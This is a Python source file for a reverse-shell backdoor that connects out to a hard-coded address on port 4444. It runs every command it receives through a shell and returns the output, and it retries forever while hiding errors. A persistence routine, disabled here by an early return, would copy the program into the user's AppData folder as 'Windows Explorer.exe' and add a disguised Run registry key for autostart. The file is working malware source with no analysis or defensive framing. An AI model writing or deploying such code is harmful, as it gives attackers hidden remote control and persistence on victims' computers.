#!/usr/bin/env python

import socket
import os
import shutil
import subprocess
import sys
class Backdoor:
    def __init__(self, host, listener):

        self.conn = socket.socket(
            socket.AF_INET,     # IPv4
            socket.SOCK_STREAM, # TCP socket
        )
             
        self.host, self.listener = host,listener
        
    
    def run(self):
        
        while True:
            sys.stdout.write('\x1b[2K')
            sys.stdout.write(f'\r[*] Waiting for connection ...')
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(( self.host, 4444) )
                    sys.stdout.write(f'\r[*] Connected to { self.host } ...')

                    while True:
                    
                        data = s.recv(1024)

                        if data == b'':
                            break

                        try:
                            result = self.execute_command(data)
                        except Exception:
                            result = b'\r Command not found\n'
                        s.send(result)
                        data = result = None
            except Exception:
                pass
    def become_persistent(self):
        return None

        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(src = sys.executable, dst = location)
            subprocess.call(
                f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {location}',
                shell = True,
            )

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True)

    def stop(self):
        self.conn.close()
        sys.stdout.write('\x1b[2K')
        sys.stdout.write(f'[+] Connection stopped')


beautiful_door = Backdoor( '192.168.1.147', 4444 )

while True:
    try:
        beautiful_door.run()
    except Exception as e:
        pass
    
beautiful_door.stop()
